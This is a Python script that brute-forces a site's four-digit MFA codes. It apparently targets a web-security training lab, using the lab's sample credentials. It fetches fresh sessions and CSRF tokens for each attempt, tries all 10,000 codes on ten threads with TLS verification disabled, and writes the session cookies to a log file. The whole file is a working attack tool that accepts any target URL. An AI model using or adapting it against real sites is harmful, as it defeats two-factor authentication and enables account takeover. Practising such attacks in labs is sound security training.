import sys
import requests
from bs4 import BeautifulSoup
import urllib3
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def new_session(url1):
    res = requests.get(url1, verify=False)
    soup = BeautifulSoup(res.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"}).get("value")
    cookies = {
        'session': res.cookies.get('session')
    }
    data = {
        'username': 'carlos',
        'password': 'montoya',
        'csrf': csrf_token
    }
    r = requests.post(url1, data=data, allow_redirects=False, cookies=cookies, verify=False)
    return r.cookies.get('session')

def new_csrf(url2, session_cookie):
    cookies = {
        'session': session_cookie
    }
    r = requests.get(url2, cookies=cookies, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})
    if csrf_input and csrf_input.has_attr("value"):
        return csrf_input["value"]
    print("[!] CSRF token not found")
    return None

def brute_forcer_thread(url1, url2, start, end):
    for i in range(start, end):
        code = str(i).zfill(4)
        sys.stdout.write('\rTrying: ' + code)
        sys.stdout.flush()

        session_cookie = new_session(url1)
        csrf = new_csrf(url2, session_cookie)
        if not csrf:
            continue

        data = {
            'csrf': csrf,
            'mfa-code': code
        }
        cookies = {
            'session': session_cookie
        }

        r = requests.post(url2, data=data, cookies=cookies, verify=False)
        status = r.status_code

        # Log to logs.txt
        with open('logs.txt', 'a') as f:
            f.write(f"[{status}] code={code}, csrf={csrf}, session={session_cookie}\n")

        if status != 200:
            print(f'\n[+] Found Code: {code} (Status: {status})')
            print(r.text)
            break

def brute_forcer(url1, url2):
    total_codes = 10000
    threads = 10
    chunk_size = total_codes // threads

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for i in range(threads):
            start = i * chunk_size
            end = total_codes if i == threads - 1 else (i + 1) * chunk_size
            executor.submit(brute_forcer_thread, url1, url2, start, end)

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        print(f"[+] Example: python3 {sys.argv[0]} https://example.com")
        sys.exit(1)

    url = sys.argv[1].rstrip("/")  # FIXED here too
    url1 = f"{url}/login"
    url2 = f"{url}/login2"

    print("[+] Starting brute-force with 10 threads")
    brute_forcer(url1, url2)

if __name__ == "__main__":
    main()
